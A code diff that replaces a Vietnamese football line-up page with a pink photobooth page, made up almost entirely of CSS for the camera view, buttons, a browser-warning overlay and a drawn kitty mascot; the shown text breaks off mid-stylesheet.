@@ -1,1031 +1,717 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-<meta charset="UTF-8">
-<title>Siêu Đội Hình Làng Dốc</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700;800;900&family=Anton&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --grass-dark:#1e4a30;
-    --grass-mid:#255a3a;
-    --grass-light:#2d6944;
-    --line:#f4f8f1;
-    --gold:#f0c04b;
-    --gold-deep:#c4922e;
-    --jersey:#8a1f2c;
-    --jersey-dark:#601621;
-    --jersey-light:#a92937;
-    --cream:#f3ecd9;
-    --ink:#1a2b1f;
-    --navy:#101c14;
-  }
-  *{box-sizing:border-box;}
-  html,body{margin:0;padding:0;}
-  body{
-    background:radial-gradient(circle at 50% 0%, #16301f 0%, #0a1811 65%, #060f0a 100%);
-    font-family:'Be Vietnam Pro', sans-serif;
-    display:flex;
-    justify-content:center;
-    padding:32px 12px;
-    min-height:100vh;
-  }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chụp Photobooth</title>
+    <style>
+* { box-sizing: border-box; }
 
-  .card{
-    width:100%;
-    max-width:460px;
-    border-radius:26px;
-    overflow:hidden;
-    box-shadow:0 40px 80px -24px rgba(0,0,0,.8), 0 0 0 1px rgba(240,192,75,.3), 0 0 60px -10px rgba(240,192,75,.12);
-    background:var(--grass-dark);
-    animation:cardIn .6s ease-out;
-  }
-  @keyframes cardIn{
-    from{opacity:0; transform:translateY(14px);}
-    to{opacity:1; transform:translateY(0);}
-  }
+:root {
+    --pink: #f85199;
+    --pink-dark: #d6136c;
+    --pink-light: #ffd8e4;
+    --pink-pale: #fff3f8;
+    --text: #4b3f47;
+}
 
-  /* ===== Header ===== */
-  .header{
-    position:relative;
+html, body { min-height: 100%; }
+
+body {
+    font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     background:
-      radial-gradient(120% 160% at 15% -20%, rgba(255,255,255,.18), transparent 55%),
-      linear-gradient(135deg, var(--jersey-dark), var(--jersey) 55%, var(--jersey-light));
-    padding:24px 20px 30px;
-    text-align:center;
-    border-bottom:4px solid var(--gold);
-    overflow:hidden;
-  }
-  .header::before{
-    content:"";
-    position:absolute;
-    inset:0;
-    background-image:
-      repeating-linear-gradient(115deg, rgba(255,255,255,.055) 0 2px, transparent 2px 26px);
-    pointer-events:none;
-  }
-  .crest{
-    width:46px;height:52px;
-    margin:0 auto 10px;
-    position:relative;
-    filter:drop-shadow(0 3px 6px rgba(0,0,0,.4));
-  }
-  .eyebrow{
-    position:relative;
-    font-size:10.5px;
-    letter-spacing:.32em;
-    color:var(--gold);
-    font-weight:700;
-    text-transform:uppercase;
-  }
-  h1{
-    position:relative;
-    font-family:'Anton', sans-serif;
-    font-weight:400;
-    color:var(--line);
-    font-size:clamp(30px, 8vw, 39px);
-    letter-spacing:.01em;
-    margin:8px 0 5px;
-    text-shadow:0 3px 0 rgba(0,0,0,.35);
-    text-transform:uppercase;
-    line-height:1.02;
-  }
-  .header .sub{
-    position:relative;
-    font-size:12px;
-    color:rgba(255,255,255,.78);
-    letter-spacing:.05em;
-  }
-  .badge-7{
-    position:absolute;
-    top:16px; right:18px;
-    width:36px;height:36px;
-    border-radius:50%;
-    background:var(--gold);
-    color:var(--jersey-dark);
-    font-family:'Anton',sans-serif;
-    display:flex;align-items:center;justify-content:center;
-    font-size:16px;
-    box-shadow:0 3px 8px rgba(0,0,0,.4), inset 0 -2px 4px rgba(0,0,0,.15);
-    border:2px solid rgba(255,255,255,.5);
-  }
+        radial-gradient(circle at 8% 12%, rgba(255,255,255,.95), transparent 23%),
+        radial-gradient(circle at 92% 88%, rgba(248,81,153,.17), transparent 25%),
+        linear-gradient(145deg, #ffd8e4 0%, #fff0f5 52%, #ffdeea 100%);
+    color: var(--text);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+    overflow: hidden;
+}
 
-  /* ===== Pitch ===== */
-  .pitch{
-    position:relative;
-    padding:30px 14px 22px;
+body::before, body::after {
+    position: fixed;
+    z-index: 0;
+    color: rgba(214,19,108,.2);
+    pointer-events: none;
+    animation: float 5s ease-in-out infinite;
+}
+body::before {
+    content: "♡";
+    left: 7%;
+    top: 13%;
+    font-size: 70px;
+    transform: rotate(-10deg);
+}
+body::after {
+    content: "✦";
+    right: 9%;
+    bottom: 14%;
+    font-size: 44px;
+    animation-delay: -2s;
+}
+
+.card {
+    position: relative;
+    z-index: 1;
+    background: rgba(255,255,255,.94);
+    backdrop-filter: blur(15px);
+    -webkit-backdrop-filter: blur(15px);
+    padding: 28px 20px 23px;
+    border-radius: 32px;
+    text-align: center;
+    width: 90%;
+    max-width: 414px;
+    border: 1px solid rgba(255,255,255,.95);
+    box-shadow: 0 24px 60px rgba(214,19,108,.15), 0 7px 20px rgba(255,182,193,.22);
+    animation: cardIn .6s cubic-bezier(.2,.8,.2,1);
+}
+
+.card::before {
+    content: "♡";
+    position: absolute;
+    top: 12px;
+    right: 18px;
+    color: #f7b3cd;
+    font-size: 18px;
+    animation: pulse 2.5s ease-in-out infinite;
+}
+
+h2 {
+    margin: 0;
+    color: var(--pink-dark);
+    font-size: 26px;
+    font-weight: 800;
+    letter-spacing: -.4px;
+}
+
+.title-sub {
+    margin: 7px 0 0;
+    color: #8a7d85;
+    font-size: 13px;
+    font-weight: 500;
+}
+
+.camera-view {
+    width: 100%;
+    height: 300px;
     background:
-      repeating-linear-gradient(180deg,
-        var(--grass-mid) 0 40px,
-        var(--grass-light) 40px 80px);
-    min-height:600px;
-  }
-  .pitch::before{
-    content:"";
-    position:absolute; inset:0;
-    background:radial-gradient(120% 60% at 50% 0%, rgba(255,255,255,.06), transparent 60%);
-    pointer-events:none;
-  }
-  .pitch-lines{
-    position:absolute; inset:12px;
-    border:2px solid rgba(244,248,241,.5);
-    border-radius:8px;
-    pointer-events:none;
-  }
-  .pitch-lines::after{
-    content:"";
-    position:absolute;
-    left:50%; top:0; bottom:0;
-    width:2px; background:rgba(244,248,241,.5);
-    transform:translateX(-50%);
-  }
-  .circle{
-    position:absolute; left:50%; top:50%;
-    width:100px; height:100px;
-    margin:-50px 0 0 -50px;
-    border:2px solid rgba(244,248,241,.5);
-    border-radius:50%;
-    pointer-events:none;
-  }
-  .dot{
-    position:absolute; left:50%; top:50%;
-    width:6px; height:6px; margin:-3px 0 0 -3px;
-    background:rgba(244,248,241,.7); border-radius:50%;
-    pointer-events:none;
-  }
-  .box-top, .box-bottom{
-    position:absolute; left:50%;
-    width:46%; height:46px;
-    margin-left:-23%;
-    border:2px solid rgba(244,248,241,.45);
-    pointer-events:none;
-  }
-  .box-top{ top:12px; border-top:none; border-radius:0 0 6px 6px;}
-  .box-bottom{ bottom:12px; border-bottom:none; border-radius:6px 6px 0 0;}
+        radial-gradient(circle at center, rgba(255,255,255,.95), transparent 48%),
+        linear-gradient(135deg, #fff4f8, #ffe5ef);
+    border-radius: 24px;
+    margin: 19px 0 16px;
+    overflow: hidden;
+    position: relative;
+    border: 2px dashed rgba(214,19,108,.55);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: inset 0 0 35px rgba(248,81,153,.08);
+    transition: .3s ease;
+}
 
-  .formation{
-    position:relative;
-    display:grid;
-    row-gap:28px;
-    padding-top:8px;
-  }
-  .row{ display:flex; justify-content:center; gap:16px; flex-wrap:wrap; }
+.camera-view::before,
+.camera-view::after {
+    content: "";
+    position: absolute;
+    z-index: 3;
+    width: 28px;
+    height: 28px;
+    border-color: var(--pink);
+    pointer-events: none;
+}
+.camera-view::before {
+    left: 14px;
+    top: 14px;
+    border-left: 3px solid;
+    border-top: 3px solid;
+    border-radius: 8px 0 0 0;
+}
+.camera-view::after {
+    right: 14px;
+    bottom: 14px;
+    border-right: 3px solid;
+    border-bottom: 3px solid;
+    border-radius: 0 0 8px 0;
+}
 
-  .player{
-    display:flex; flex-direction:column; align-items:center;
-    width:90px;
-    animation:popIn .5s ease-out backwards;
-  }
-  .row:nth-child(1) .player{ animation-delay:.05s; }
-  .row:nth-child(2) .player{ animation-delay:.12s; }
-  .row:nth-child(3) .player{ animation-delay:.19s; }
-  .row:nth-child(4) .player{ animation-delay:.26s; }
-  .row:nth-child(5) .player{ animation-delay:.33s; }
-  @keyframes popIn{
-    from{opacity:0; transform:translateY(10px) scale(.92);}
-    to{opacity:1; transform:translateY(0) scale(1);}
-  }
+video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: none;
+    transform: scaleX(-1);
+}
 
-  .shadow-ell{
-    width:38px; height:9px;
-    background:rgba(0,0,0,.35);
-    border-radius:50%;
-    filter:blur(1.5px);
-    margin-top:-6px;
-  }
+#msg {
+    color: #8b7d85 !important;
+    font-size: 13px;
+    font-weight: 500;
+}
 
-  .shirt{
-    position:relative;
-    width:58px; height:54px;
-    background:linear-gradient(160deg, var(--jersey-light) 0%, var(--jersey) 45%, var(--jersey-dark) 100%);
-    clip-path:polygon(18% 0%, 0% 20%, 14% 40%, 22% 32%, 22% 100%, 78% 100%, 78% 32%, 86% 40%, 100% 20%, 82% 0%, 68% 11%, 32% 11%);
-    display:flex; align-items:flex-end; justify-content:center;
-    box-shadow:0 6px 12px rgba(0,0,0,.4), inset 0 -8px 12px rgba(0,0,0,.25), inset 0 4px 6px rgba(255,255,255,.12);
-  }
-  .shirt::after{
-    content:"";
-    position:absolute; top:0; left:44%; width:12%; height:15%;
-    background:var(--gold);
-    border-radius:0 0 3px 3px;
-  }
-  .shirt span{
-    font-family:'Anton',sans-serif;
-    color:var(--gold);
-    font-size:20px;
-    margin-bottom:6px;
-    text-shadow:0 1px 2px rgba(0,0,0,.4);
-  }
-  .gk .shirt{
-    background:linear-gradient(160deg, #f7d876, var(--gold) 45%, var(--gold-deep) 100%);
-  }
-  .gk .shirt span{ color:var(--jersey-dark); }
-  .gk .shirt::after{ background:var(--jersey); }
+.camera-status {
+    position: absolute;
+    top: 12px;
+    left: 12px;
+    z-index: 4;
+    padding: 6px 10px;
+    border-radius: 999px;
+    background: rgba(255,255,255,.86);
+    color: #74666e;
+    font-size: 10px;
+    font-weight: 800;
+    box-shadow: 0 5px 15px rgba(0,0,0,.07);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+.camera-status::before {
+    content: "";
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: #f0b4c9;
+}
+.camera-view.camera-ready {
+    border-style: solid;
+    border-color: rgba(248,81,153,.8);
+    box-shadow: inset 0 0 35px rgba(248,81,153,.12), 0 0 0 5px rgba(248,81,153,.05);
+}
+.camera-view.camera-ready .camera-status::before {
+    background: #45c97b;
+    box-shadow: 0 0 0 4px rgba(69,201,123,.13);
+}
 
-  .name{
-    margin-top:8px;
-    font-weight:800;
-    font-size:13.5px;
-    color:var(--line);
-    text-align:center;
-    line-height:1.15;
-    text-shadow:0 1px 3px rgba(0,0,0,.5);
-  }
-  .alias{
-    font-size:10.5px;
-    font-weight:700;
-    color:var(--gold);
-    text-transform:uppercase;
-    letter-spacing:.03em;
-    text-shadow:0 1px 2px rgba(0,0,0,.4);
-  }
-  .pos{
-    margin-top:3px;
-    font-size:9px;
-    font-weight:700;
-    letter-spacing:.09em;
-    color:rgba(255,255,255,.68);
-    text-transform:uppercase;
-    background:rgba(0,0,0,.22);
-    padding:2px 7px;
-    border-radius:20px;
-  }
+.btn {
+    position: relative;
+    overflow: hidden;
+    background: linear-gradient(135deg, #ff69a8, #e92b7b);
+    color: white;
+    border: none;
+    padding: 17px;
+    width: 100%;
+    border-radius: 18px;
+    font-weight: 800;
+    cursor: pointer;
+    font-size: 16px;
+    letter-spacing: .15px;
+    transition: transform .18s ease, box-shadow .18s ease;
+    box-shadow: 0 10px 24px rgba(248,81,153,.28);
+}
+.btn::after {
+    content: "";
+    position: absolute;
+    top: -90%;
+    left: -30%;
+    width: 32%;
+    height: 280%;
+    transform: rotate(22deg);
+    background: rgba(255,255,255,.35);
+    transition: left .55s ease;
+}
+.btn:hover::after { left: 110%; }
+.btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 13px 28px rgba(248,81,153,.34);
+}
+.btn:active { transform: scale(.98); }
+.btn:disabled {
+    background: linear-gradient(135deg, #d8d3d6, #bcb7bb);
+    color: #777;
+    cursor: not-allowed;
+    box-shadow: none;
+}
+.btn:disabled::after { display: none; }
 
-  /* ===== Footer strip (ticket style) ===== */
-  .footer{
-    position:relative;
-    background:var(--cream);
-    padding:16px 22px 20px;
-    text-align:center;
-  }
-  .footer::before{
-    content:"";
-    position:absolute; top:-11px; left:0; right:0; height:22px;
-    background-image: radial-gradient(circle, var(--navy) 9px, transparent 10px);
-    background-size:24px 22px;
-    background-position:0 0;
-    background-repeat:repeat-x;
-  }
-  .footer .line1{
-    font-family:'Anton',sans-serif;
-    color:var(--jersey);
-    font-size:16px;
-    letter-spacing:.04em;
-  }
-  .footer .line2{
-    margin-top:3px;
-    font-size:11px;
-    color:#7a6a44;
-    font-weight:600;
-  }
-  .divider{
-    width:60px; height:2px;
-    background:var(--gold-deep);
-    opacity:.5;
-    margin:8px auto;
-    border-radius:2px;
-  }
+#status {
+    font-size: 13px;
+    color: #5f525a;
+    margin-top: 14px;
+    line-height: 1.5;
+    font-weight: 600;
+}
 
-  /* ===== Floodlights ===== */
-  .floodlights{
-    position:absolute; inset:0;
-    overflow:hidden;
-    pointer-events:none;
-    z-index:0;
-  }
-  .beam{
-    position:absolute; top:-20%;
-    width:140px; height:220%;
-    background:linear-gradient(180deg, rgba(255,255,255,.16), transparent 70%);
-    transform-origin:top center;
-    filter:blur(2px);
-    animation:sweep 7s ease-in-out infinite;
-  }
-  .beam.b1{ left:-10%; transform:rotate(18deg); animation-delay:0s;}
-  .beam.b2{ right:-14%; transform:rotate(-22deg); animation-delay:2.3s;}
-  @keyframes sweep{
-    0%,100%{ opacity:.35; }
-    50%{ opacity:.75; }
-  }
+.stepper {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    margin-top: 15px;
+}
+.step {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    color: #aaa0a7;
+    font-size: 10px;
+    font-weight: 700;
+}
+.step.active { color: var(--pink-dark); }
+.step .circle {
+    width: 21px;
+    height: 21px;
+    border-radius: 50%;
+    display: grid;
+    place-items: center;
+    background: #f0ebee;
+    color: #93888e;
+    font-size: 10px;
+}
+.step.active .circle {
+    background: var(--pink);
+    color: white;
+    box-shadow: 0 0 0 4px rgba(248,81,153,.1);
+}
+.step-line {
+    width: 25px;
+    height: 2px;
+    border-radius: 99px;
+    background: #eee5e9;
+}
 
-  /* ===== Crest glow ===== */
-  .crest{ animation:crestGlow 2.6s ease-in-out infinite; }
-  @keyframes crestGlow{
-    0%,100%{ filter:drop-shadow(0 3px 6px rgba(0,0,0,.4)) drop-shadow(0 0 0 rgba(240,192,75,0)); }
-    50%{ filter:drop-shadow(0 3px 6px rgba(0,0,0,.4)) drop-shadow(0 0 10px rgba(240,192,75,.75)); }
-  }
+#browser-warning {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: linear-gradient(145deg,#ffd8e4,#fff0f5);
+    z-index: 10000;
+    padding: 30px 20px;
+    box-sizing: border-box;
+    align-items: center;
+    justify-content: center;
+}
 
-  /* ===== Shirt hover / shimmer ===== */
-  .shirt{ transition:transform .25s ease; }
-  .player:active .shirt, .player:hover .shirt{ transform:translateY(-4px) scale(1.05); }
+.warning-box {
+    max-width: 420px;
+    background: rgba(255,255,255,.96);
+    border: 1px solid rgba(248,81,153,.3);
+    padding: 30px 24px;
+    border-radius: 28px;
+    text-align: center;
+    box-shadow: 0 20px 50px rgba(214,19,108,.16);
+}
+.warning-box h3 { color: var(--pink-dark); margin-top: 0; }
+.steps {
+    text-align: left;
+    margin-top: 20px;
+    color: #5c5158;
+    font-size: 15px;
+    line-height: 1.8;
+}
+.highlight { color: var(--pink-dark); font-weight: bold; }
 
-  /* ===== Kickoff button ===== */
-  .kickoff-wrap{
-    position:relative;
-    display:flex; justify-content:center;
-    padding:16px 0 20px;
-    background:var(--cream);
-  }
-  .kickoff{
-    position:relative;
-    font-family:'Anton', sans-serif;
-    letter-spacing:.06em;
-    font-size:14px;
-    color:var(--cream);
-    background:linear-gradient(160deg, var(--jersey-light), var(--jersey-dark));
-    border:2px solid var(--gold-deep);
-    border-radius:999px;
-    padding:11px 26px;
-    cursor:pointer;
-    box-shadow:0 6px 14px rgba(0,0,0,.35);
-    transition:transform .15s ease, box-shadow .15s ease;
-  }
-  .kickoff:hover{ transform:translateY(-2px); box-shadow:0 10px 18px rgba(0,0,0,.4); }
-  .kickoff:active{ transform:translateY(0) scale(.97); }
+@keyframes cardIn {
+    from { opacity: 0; transform: translateY(18px) scale(.98); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+}
+@keyframes float {
+    0%,100% { transform: translateY(0) rotate(-5deg); }
+    50% { transform: translateY(-12px) rotate(5deg); }
+}
+@keyframes pulse {
+    0%,100% { opacity: .45; transform: scale(1); }
+    50% { opacity: 1; transform: scale(1.15); }
+}
 
-  #confetti-canvas{
-    position:fixed; inset:0;
-    pointer-events:none;
-    z-index:999;
-  }
+@media (max-height: 700px) {
+    .card { padding: 20px 17px; }
+    .camera-view { height: 230px; margin-top: 13px; }
+    .stepper { margin-top: 10px; }
+}
 
-  /* ===== Scoreboard ===== */
-  .scoreboard{
-    position:relative;
-    margin:0 20px 4px;
-    background:linear-gradient(180deg,#0d1a12,#060d09);
-    border:2px solid var(--gold-deep);
-    border-radius:10px;
-    padding:8px 14px;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    box-shadow:inset 0 2px 6px rgba(0,0,0,.6);
-    z-index:1;
-  }
-  .scoreboard .team{
-    font-family:'Anton',sans-serif;
-    font-size:13px;
-    color:#e7f6ea;
-    letter-spacing:.05em;
-  }
-  .scoreboard .score{
-    font-family:'Anton',sans-serif;
-    font-size:22px;
-    color:#7CFC9A;
-    text-shadow:0 0 8px rgba(124,252,154,.7);
-    letter-spacing:.1em;
-  }
-  .scoreboard .clock{
-    font-family:'Anton',sans-serif;
-    font-size:11px;
-    color:var(--gold);
-    background:#000;
-    padding:2px 6px;
-    border-radius:4px;
-    animation:blink 1.6s steps(1) infinite;
-  }
-  @keyframes blink{ 50%{ opacity:.35; } }
+/* ===== PHOTObooth skin: visual only ===== */
+body {
+    background:
+        radial-gradient(circle at 8% 10%, rgba(255,255,255,.9) 0 4px, transparent 5px),
+        radial-gradient(circle at 24% 18%, rgba(255,255,255,.8) 0 3px, transparent 4px),
+        radial-gradient(circle at 80% 14%, rgba(255,255,255,.85) 0 4px, transparent 5px),
+        radial-gradient(circle at 90% 42%, rgba(255,255,255,.75) 0 3px, transparent 4px),
+        radial-gradient(circle at 12% 70%, rgba(255,255,255,.8) 0 4px, transparent 5px),
+        linear-gradient(135deg, #ffd5e4 0%, #fff0f6 48%, #ffd7e7 100%) !important;
+    overflow-x: hidden !important;
+    overflow-y: auto !important;
+}
 
-  /* ===== Sparkles on shirt hover ===== */
-  .player{ position:relative; }
-  .sparkle{
-    position:absolute;
-    width:4px;height:4px;
-    background:var(--gold);
-    border-radius:50%;
-    pointer-events:none;
-    opacity:0;
-  }
+body::before {
+    content: "♡   ✦   ♡";
+    left: 5%;
+    top: 9%;
+    color: rgba(248,81,153,.25);
+    font-size: 28px;
+    letter-spacing: 14px;
+}
+body::after {
+    content: "🎀   ♡";
+    right: 4%;
+    bottom: 12%;
+    color: rgba(248,81,153,.3);
+    font-size: 27px;
+}
 
-  /* ===== Music toggle button ===== */
-  .controls{
-    display:flex; gap:10px; justify-content:center;
-    flex-wrap:wrap;
-  }
-  .music-btn{
-    position:relative;
-    font-family:'Be Vietnam Pro',sans-serif;
-    font-weight:700;
-    font-size:12.5px;
-    color:var(--jersey);
-    background:transparent;
-    border:2px solid var(--jersey);
-    border-radius:999px;
-    padding:9px 18px;
-    cursor:pointer;
-    transition:all .2s ease;
-  }
-  .music-btn.on{
-    background:var(--jersey);
-    color:var(--cream);
-  }
-  .music-btn:hover{ transform:translateY(-2px); }
+.card {
+    margin: 92px auto 28px !important;
+    padding: 29px 20px 25px !important;
+    width: min(92%, 430px) !important;
+    max-width: 430px !important;
+    border-radius: 34px !important;
+    background: rgba(255,255,255,.91) !important;
+    border: 2px solid rgba(255,255,255,.95) !important;
+    box-shadow:
+        0 0 0 3px rgba(248,81,153,.10),
+        0 20px 55px rgba(214,19,108,.18),
+        inset 0 0 30px rgba(255,182,207,.16) !important;
+}
 
-  /* ===== Cursor spotlight on pitch ===== */
-  .pitch{ cursor:none; }
-  .spotlight{
-    position:absolute;
-    width:140px; height:140px;
-    border-radius:50%;
-    background:radial-gradient(circle, rgba(255,255,255,.16), transparent 70%);
-    pointer-events:none;
-    transform:translate(-50%,-50%);
-    z-index:1;
-    transition:opacity .2s ease;
-    opacity:0;
-  }
+h2 {
+    color: #df2b76 !important;
+    font-size: 31px !important;
+    line-height: 1.14 !important;
+    font-weight: 900 !important;
+    text-shadow: 0 2px 0 rgba(255,255,255,.9);
+}
 
-  /* ===== Coach card ===== */
-  .coach-wrap{
-    position:relative;
-    margin:0 20px 12px;
-    z-index:1;
-  }
-  .coach-card{
-    position:relative;
-    display:flex;
-    align-items:center;
-    gap:12px;
-    background:linear-gradient(120deg, rgba(240,192,75,.16), rgba(240,192,75,.04));
-    border:1.5px solid rgba(240,192,75,.55);
-    border-radius:14px;
-    padding:10px 14px;
-    overflow:hidden;
-  }
-  .coach-card::before{
-    content:"";
-    position:absolute; inset:0;
-    background:linear-gradient(100deg, transparent 20%, rgba(255,255,255,.25) 40%, transparent 60%);
-    background-size:200% 100%;
-    animation:shine 3.2s ease-in-out infinite;
-  }
-  @keyframes shine{
-    0%{ background-position:160% 0; }
-    100%{ background-position:-60% 0; }
-  }
-  .coach-badge{
-    width:34px; height:34px;
-    border-radius:50%;
-    background:linear-gradient(160deg,#f7d876, var(--gold) 60%, var(--gold-deep));
-    display:flex; align-items:center; justify-content:center;
-    font-size:16px;
-    flex-shrink:0;
-    box-shadow:0 3px 6px rgba(0,0,0,.35);
-  }
-  .coach-text{ position:relative; }
-  .coach-label{
-    font-size:9px;
-    letter-spacing:.14em;
-    color:var(--gold);
-    font-weight:700;
-    text-transform:uppercase;
-  }
-  .coach-name{
-    font-family:'Anton',sans-serif;
-    font-size:16px;
-    color:var(--line);
-    letter-spacing:.02em;
-  }
+.title-sub {
+    color: #8c596d !important;
+    font-size: 15px !important;
+    font-weight: 700 !important;
+    line-height: 1.4 !important;
+}
 
-  /* ===== Particle trail following spotlight ===== */
-  .trail-particle{
-    position:absolute;
-    width:5px; height:5px;
-    border-radius:50%;
-    background:var(--gold);
-    pointer-events:none;
-    z-index:1;
-    box-shadow:0 0 6px 1px rgba(240,192,75,.8);
-  }
+.camera-view {
+    height: 330px !important;
+    margin: 23px 0 18px !important;
+    border: 3px dashed #f28ab3 !important;
+    border-radius: 28px !important;
+    background:
+        radial-gradient(circle at 50% 48%, rgba(255,255,255,.78), transparent 38%),
+        linear-gradient(145deg, #ffeaf2, #fff1f6) !important;
+    box-shadow:
+        inset 0 0 0 7px rgba(255,255,255,.34),
+        inset 0 0 35px rgba(248,81,153,.11),
+        0 6px 0 rgba(248,81,153,.06) !important;
+}
 
-  /* ===== Pulsing pitch lines ===== */
-  .pitch-lines, .circle, .box-top, .box-bottom{
-    animation:linePulse 4s ease-in-out infinite;
-  }
-  @keyframes linePulse{
-    0%,100%{ opacity:.55; }
-    50%{ opacity:.9; }
-  }
+.camera-view::before,
+.camera-view::after {
+    width: 38px !important;
+    height: 38px !important;
+    border-width: 4px !important;
+    border-color: #ef3d84 !important;
+}
 
-  /* ===== Ripple on tap ===== */
-  .ripple{
-    position:absolute;
-    border-radius:50%;
-    background:rgba(240,192,75,.45);
-    transform:translate(-50%,-50%) scale(0);
-    pointer-events:none;
-    animation:rippleOut .6s ease-out forwards;
-  }
-  @keyframes rippleOut{
-    to{ transform:translate(-50%,-50%) scale(1); opacity:0; }
-  }
+.camera-status {
+    top: 14px !important;
+    left: 14px !important;
+    padding: 7px 12px !important;
+    color: #e6387e !important;
+    border: 1px solid #f5a1c0 !important;
+    background: rgba(255,255,255,.9) !important;
+}
 
-  /* ===== Subtle grass shimmer ===== */
-  .pitch::after{
-    content:"";
-    position:absolute; inset:0;
-    background:linear-gradient(120deg, transparent 30%, rgba(255,255,255,.05) 45%, transparent 60%);
-    background-size:250% 250%;
-    animation:grassShimmer 9s linear infinite;
-    pointer-events:none;
-  }
-  @keyframes grassShimmer{
-    0%{ background-position:120% 0%; }
-    100%{ background-position:-30% 100%; }
-  }
-  /* ===== Substitutes bench ===== */
-  .bench-wrap{
-    background:var(--grass-dark);
-    padding:4px 18px 18px;
-    position:relative;
-  }
-  .bench-title{
-    display:flex;
-    align-items:center;
-    gap:8px;
-    margin-bottom:12px;
-  }
-  .bench-title .line{
-    flex:1;
-    height:1px;
-    background:rgba(244,248,241,.25);
-  }
-  .bench-title span{
-    font-size:10.5px;
-    letter-spacing:.2em;
-    color:rgba(244,248,241,.65);
-    font-weight:700;
-    text-transform:uppercase;
-    white-space:nowrap;
-  }
-  .bench-row{
-    display:flex;
-    justify-content:space-between;
-    gap:8px;
-  }
-  .bench-player{
-    display:flex; flex-direction:column; align-items:center;
-    flex:1;
-  }
-  .bench-shirt{
-    position:relative;
-    width:42px; height:40px;
-    background:linear-gradient(160deg, #4a4f57 0%, #2c2f35 100%);
-    clip-path:polygon(18% 0%, 0% 20%, 14% 40%, 22% 32%, 22% 100%, 78% 100%, 78% 32%, 86% 40%, 100% 20%, 82% 0%, 68% 11%, 32% 11%);
-    display:flex; align-items:flex-end; justify-content:center;
-    box-shadow:0 3px 7px rgba(0,0,0,.35);
-    transition:transform .2s ease;
-  }
-  .bench-player:hover .bench-shirt, .bench-player:active .bench-shirt{ transform:translateY(-3px); }
-  .bench-shirt span{
-    font-family:'Anton',sans-serif;
-    color:var(--gold);
-    font-size:14px;
-    margin-bottom:4px;
-  }
-  .bench-name{
-    margin-top:6px;
-    font-size:10.5px;
-    font-weight:700;
-    color:var(--line);
-    text-align:center;
-    line-height:1.15;
-  }
+#msg {
+    color: #9a6579 !important;
+    font-size: 16px !important;
+    font-weight: 800 !important;
+}
+
+.btn {
+    min-height: 65px !important;
+    border-radius: 20px !important;
+    background: linear-gradient(135deg, #ff66a5, #ef2e7e) !important;
+    font-size: 19px !important;
+    font-weight: 900 !important;
+    box-shadow:
+        0 8px 0 #d91e69,
+        0 14px 27px rgba(248,81,153,.25) !important;
+}
+
+.btn:active {
+    transform: translateY(5px) scale(.99) !important;
+    box-shadow: 0 3px 0 #d91e69 !important;
+}
+
+#status {
+    color: #8d5c70 !important;
+    font-size: 15px !important;
+    font-weight: 800 !important;
+}
+
+.stepper {
+    display: none !important;
+}
+
+/* Kitty lớn nằm phía trên card */
+.kitty-top {
+    position: fixed;
+    z-index: 10;
+    left: 50%;
+    top: 18px;
+    width: 142px;
+    height: 128px;
+    transform: translateX(-50%);
+    pointer-events: none;
+    animation: kittyFloatTop 3.6s ease-in-out infinite;
+    filter: drop-shadow(0 8px 8px rgba(214,19,108,.14));
+}
+.kitty-top .face {
+    position: absolute;
+    left: 18px;
+    top: 19px;
+    width: 106px;
+    height: 91px;
+    background: #fff;
+    border: 3px solid #ef9fbd;
+    border-radius: 48% 48% 46% 46%;
+}
+.kitty-top .ear {
+    position: absolute;
+    top: -15px;
+    width: 39px;
+    height: 38px;
+    background: #fff;
+    border: 3px solid #ef9fbd;
+    z-index: -1;
+}
+.kitty-top .ear.l {
+    left: 4px;
+    transform: rotate(-17deg);
+    border-radius: 75% 20% 20% 20%;
+}
+.kitty-top .ear.r {
+    right: 4px;
+    transform: rotate(17deg);
+    border-radius: 20% 75% 20% 20%;
+}
+.kitty-top .eye {
+    position: absolute;
+    top: 42px;
+    width: 9px;
+    height: 15px;
+    border-radius: 50%;
+    background: #3d3339;
+}
+.kitty-top .eye.l { left: 34px; }
+.kitty-top .eye.r { right: 34px; }
+.kitty-top .nose {
+    position: absolute;
+    left: 50%;
+    top: 58px;
+    width: 14px;
+    height: 9px;
+    transform: translateX(-50%);
+    border-radius: 50%;
+    background: #ffd43f;
+    border: 1px solid #e3b731;
+}
+.kitty-top .whisker {
+    position: absolute;
+    width: 29px;
+    height: 2px;
+    background: #8d7d84;
+    border-radius: 2px;
+}
+.kitty-top .w1 { left: -15px; top: 55px; transform: rotate(8deg); }
+.kitty-top .w2 { left: -15px; top: 66px; transform: rotate(-8deg); }
+.kitty-top .w3 { right: -15px; top: 55px; transform: rotate(-8deg); }
+.kitty-top .w4 { right: -15px; top: 66px; transform: rotate(8deg); }
+
+.kitty-top .bow {
+    position: absolute;
+    top: -13px;
+    right: -7px;
+    width: 48px;
+    height: 35px;
+}
+.kitty-top .bow::before,
+.kitty-top .bow::after {
+    content: "";
+    position: absolute;
+    top: 2px;
+    width: 27px;
+    height: 30px;
+    background: #f34d93;
+    border: 2px solid #d82b73;
+}
+.kitty-top .bow::before {
+    left: 0;
+    transform: rotate(-15deg);
+    border-radius: 75% 20% 70% 25%;
+}
+.kitty-top .bow::after {
+    right: 0;
+    transform: rotate(15deg);
+    border-radius: 20% 75% 25% 70%;
+}
+.kitty-top .bow i {
+    position: absolute;
+    z-index: 2;
+    left: 50%;
+    top: 10px;
+    width: 16px;
+    height: 16px;
